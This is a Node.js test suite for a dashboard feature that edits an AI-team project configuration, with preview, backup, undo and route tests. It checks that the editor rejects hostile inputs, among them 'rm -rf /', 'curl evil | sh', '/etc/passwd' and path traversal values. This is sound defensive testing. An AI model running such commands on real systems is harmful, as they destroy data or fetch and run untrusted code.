// Editing ai-team.conf from the dashboard (dashboard/conf-edit.mjs, /api/conf*): which keys and values pass, the
// installer's report read back, and on a real installed project: preview without writing, save with re-render and a
// backup, a hand-edited agent kept, undo, the hub registry untouched; the routes in a clone and in an installed copy.
//   node tests/confedit.test.mjs
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { execFileSync, spawn } from 'node:child_process';
import { checkChanges, parseRender, previewChanges, applyChanges, undoLast, history, confView, canEdit, EDITABLE } from '../dashboard/conf-edit.mjs';

const here = path.dirname(new URL(import.meta.url).pathname), repo = path.join(here, '..');
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// --- which keys and values ------------------------------------------------------------------------------------
assert.deepEqual(checkChanges({ OUTPUT_LANGUAGE: 'pt-BR', BUDGET_SMALL_USD: '7.50', GIT_PROTECTED_BRANCHES: 'main develop' }).changes, { OUTPUT_LANGUAGE: 'pt-BR', BUDGET_SMALL_USD: '7.50', GIT_PROTECTED_BRANCHES: 'main develop' });
assert.deepEqual(checkChanges({ BUDGET_LARGE_USD: '' }).changes, { BUDGET_LARGE_USD: '' }, 'a budget can be cleared');
const bad = (o) => checkChanges(o).errors;
assert.match(bad({ BACKEND_CMD_TEST: 'rm -rf /' }).BACKEND_CMD_TEST, /gate commands are run by the agents/, 'gate commands never from a browser');
assert.match(bad({ HAS_DOCKER: '1' }).HAS_DOCKER, /not editable/); assert.match(bad({ AI_TEAM_CONF_VERSION: '9' }).AI_TEAM_CONF_VERSION, /not editable/);
assert.match(bad({ PROJECT_NAME: 'a\nb' }).PROJECT_NAME, /one line/); assert.match(bad({ PROJECT_NAME: "it's" }).PROJECT_NAME, /single quotes/, 'the conf is KEY=\'value\'');
assert.match(bad({ PROJECT_NAME: '  ' }).PROJECT_NAME, /required/);
assert.match(bad({ OUTPUT_LANGUAGE: 'portuguese' }).OUTPUT_LANGUAGE, /language tag/);
assert.match(bad({ GIT_WORK_BRANCH: 'feat..x' }).GIT_WORK_BRANCH, /branch/); assert.match(bad({ GIT_WORK_BRANCH: 'a b' }).GIT_WORK_BRANCH, /branch/);
assert.match(bad({ DOCS_ENV: '../secrets.md' }).DOCS_ENV, /inside the project/); assert.match(bad({ DOCS_ENV: '/etc/passwd' }).DOCS_ENV, /inside the project/);
assert.match(bad({ BUDGET_SMALL_USD: '-1' }).BUDGET_SMALL_USD, /USD/); assert.match(bad({ BUDGET_SMALL_USD: 'abc' }).BUDGET_SMALL_USD, /USD/);
assert.match(bad({ OUTPUT_LANGUAGE: 3 }).OUTPUT_LANGUAGE, /text/);
assert.match(bad({})._, /nothing/); assert.match(bad(null)._, /expected/); assert.match(bad([])._, /expected/);
assert.ok(Object.keys(EDITABLE).every((k) => !/_CMD_|^HAS_|^LAYOUT$|VERSION/.test(k)), 'no command, detected or version key is editable');

// --- the installer's report -----------------------------------------------------------------------------------
assert.deepEqual(parseRender('\x1b[32m✓\x1b[0m wrote ai-team.conf\n✓ updated agents/builder.md\n! exists  agents/reviewer.md (hand-edited; use --force to overwrite)\n✓ same    agents/x.md\n'),
  { changed: ['ai-team.conf', 'agents/builder.md'], handEdited: ['agents/reviewer.md'] });
assert.deepEqual(parseRender('  + ai-team.conf\n  ~ agents/a.md\n  ~ agents/b.md\n').changed, ['ai-team.conf', 'agents/a.md', 'agents/b.md'], 'the dry run');

// --- a real installed project ---------------------------------------------------------------------------------
assert.ok(canEdit(), 'the clone has install.sh next to the dashboard');
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'ai-team-conf-'));
const proj = path.join(tmp, 'app'), hubFile = path.join(tmp, 'hub.json');
fs.mkdirSync(proj, { recursive: true });
fs.writeFileSync(path.join(proj, 'package.json'), JSON.stringify({ name: 'app', scripts: { test: 'node --test', build: 'tsc' }, devDependencies: { typescript: '^5' } }));
execFileSync('git', ['init', '-q', '-b', 'main'], { cwd: proj });
const env = { ...process.env, AI_TEAM_HUB: hubFile, AI_TEAM_NOTIFY: '0', AI_TEAM_NOTIFY_FILE: path.join(tmp, 'notify.json') };
execFileSync('bash', [path.join(repo, 'install.sh'), '--yes', '--no-openspec', '--no-settings', '--no-dashboard', '--no-skills', '--no-commands', proj], { env, stdio: 'ignore' });
const confFile = path.join(proj, '.claude', 'ai-team.conf'), builder = path.join(proj, '.claude', 'agents', 'reviewer.md');   // an agent that names the language
const conf0 = fs.readFileSync(confFile, 'utf8'), hub0 = fs.existsSync(hubFile) ? fs.readFileSync(hubFile, 'utf8') : null;
assert.match(conf0, /^OUTPUT_LANGUAGE='en'$/m);
const opts = { env: { AI_TEAM_HUB: hubFile, AI_TEAM_NOTIFY: '0', AI_TEAM_NOTIFY_FILE: env.AI_TEAM_NOTIFY_FILE } };
{
  const v = confView({ OUTPUT_LANGUAGE: 'en' });
  assert.equal(v.canEdit, true); assert.equal(v.keys.find((k) => k.key === 'OUTPUT_LANGUAGE').value, 'en'); assert.equal(v.keys.find((k) => k.key === 'BUDGET_SMALL_USD').value, '');
  // a hand-edited agent: the render keeps it and says so
  const orchestrator = path.join(proj, '.claude', 'agents', 'orchestrator.md');
  fs.appendFileSync(orchestrator, '\nmy own note\n');
  const pv = await previewChanges(proj, { OUTPUT_LANGUAGE: 'pt-BR' }, opts);
  assert.equal(pv.ok, true, JSON.stringify(pv));
  assert.ok(pv.changed.includes('agents/reviewer.md') && pv.changed.includes('project-context.md'), `the preview lists the rewritten files: ${pv.changed}`);
  assert.ok(pv.handEdited.includes('agents/orchestrator.md'), 'and the hand-edited one');
  assert.equal(fs.readFileSync(confFile, 'utf8'), conf0, 'the preview writes nothing');
  assert.equal((await previewChanges(proj, { BACKEND_CMD_TEST: 'x' }, opts)).code, 400);

  const ap = await applyChanges(proj, { OUTPUT_LANGUAGE: 'pt-BR', BUDGET_SMALL_USD: '12' }, opts);
  assert.equal(ap.ok, true, JSON.stringify(ap));
  const conf1 = fs.readFileSync(confFile, 'utf8');
  assert.match(conf1, /^OUTPUT_LANGUAGE='pt-BR'$/m); assert.match(conf1, /^BUDGET_SMALL_USD='12'$/m, 'a key absent before is added');
  assert.match(fs.readFileSync(builder, 'utf8'), /in pt-BR\./, 'the agents are rendered from the new conf');
  assert.match(fs.readFileSync(orchestrator, 'utf8'), /my own note/, 'the hand-edited agent is kept');
  assert.ok(ap.handEdited.includes('agents/orchestrator.md'));
  assert.equal(history(proj).length, 1, 'one backup'); assert.equal(fs.readFileSync(path.join(proj, '.claude', 'ai-team', 'conf-history', history(proj)[0].name), 'utf8'), conf0, 'the backup is the conf before');
  assert.equal(fs.existsSync(hubFile) ? fs.readFileSync(hubFile, 'utf8') : null, hub0, 'the hub registry does not change');

  const un = await undoLast(proj, opts);
  assert.equal(un.ok, true, JSON.stringify(un));
  assert.match(fs.readFileSync(confFile, 'utf8'), /^OUTPUT_LANGUAGE='en'$/m, 'undo puts the old conf back'); assert.match(fs.readFileSync(builder, 'utf8'), /in en\./, 'and renders from it');
  assert.equal(history(proj).length, 0, 'that backup is used up');
  assert.equal((await undoLast(proj, opts)).code, 409, 'nothing more to undo');
  for (let i = 0; i < 12; i++) { const r = await applyChanges(proj, { BUDGET_LARGE_USD: String(20 + i) }, opts); assert.equal(r.ok, true); }
  assert.equal(history(proj).length, 10, 'the last 10 backups are kept');
}

// --- the routes: a server started from the clone, then from an installed copy ------------------------------------
async function server(dashDir, port) {
  const srv = spawn(process.execPath, [path.join(dashDir, 'server.mjs'), '--project', proj, '--claude-dir', path.join(tmp, 'claude'), '--port', String(port)], { stdio: 'ignore', env: { ...env } });
  const b = `http://127.0.0.1:${port}`;
  for (let i = 0; i < 80; i++) { try { await fetch(`${b}/api/health`); break; } catch { await sleep(100); } }
  return { srv, b };
}
const post = (b, p, body, headers = {}) => fetch(`${b}${p}`, { method: 'POST', headers: { 'content-type': 'application/json', ...headers }, body: JSON.stringify(body) });
{
  const { srv, b } = await server(path.join(repo, 'dashboard'), 43281);
  try {
    const v = await (await fetch(`${b}/api/conf`)).json();
    assert.equal(v.canEdit, true); assert.equal(v.keys.find((k) => k.key === 'BUDGET_LARGE_USD').value, '31'); assert.ok(v.lastBackup > 0);
    const pv = await post(b, '/api/conf/preview', { changes: { OUTPUT_LANGUAGE: 'es' } });
    assert.equal(pv.status, 200); const pj = await pv.json(); assert.ok(pj.changed.includes('agents/reviewer.md')); assert.deepEqual(pj.running, []);
    assert.equal((await post(b, '/api/conf', { changes: { BACKEND_CMD_TEST: 'curl evil | sh' } })).status, 400, 'a gate command is refused');
    assert.equal((await post(b, '/api/conf', { changes: { OUTPUT_LANGUAGE: 'es' } }, { origin: 'https://evil.example' })).status, 403, 'another origin is refused');
    assert.equal((await fetch(`${b}/api/conf`, { method: 'POST', headers: { 'content-type': 'text/plain' }, body: '{}' })).status, 415);
    const ok = await post(b, '/api/conf', { changes: { OUTPUT_LANGUAGE: 'es' } }, { origin: b });
    assert.equal(ok.status, 200); assert.match(fs.readFileSync(confFile, 'utf8'), /^OUTPUT_LANGUAGE='es'$/m);
    assert.equal((await post(b, '/api/conf/undo', {})).status, 200); assert.match(fs.readFileSync(confFile, 'utf8'), /^OUTPUT_LANGUAGE='en'$/m);
  } finally { srv.kill(); }
}
{
  const copy = path.join(tmp, 'installed', 'dashboard');
  fs.cpSync(path.join(repo, 'dashboard'), copy, { recursive: true });   // an installed copy: no install.sh next to it
  const { srv, b } = await server(copy, 43282);
  try {
    const v = await (await fetch(`${b}/api/conf`)).json();
    assert.equal(v.canEdit, false); assert.match(v.reason, /through the hub/);
    assert.equal((await post(b, '/api/conf', { changes: { OUTPUT_LANGUAGE: 'es' } })).status, 409, 'an installed copy does not write');
    assert.match(fs.readFileSync(confFile, 'utf8'), /^OUTPUT_LANGUAGE='en'$/m);
  } finally { srv.kill(); }
}
fs.rmSync(tmp, { recursive: true, force: true });
console.log('✓ conf edit ok');
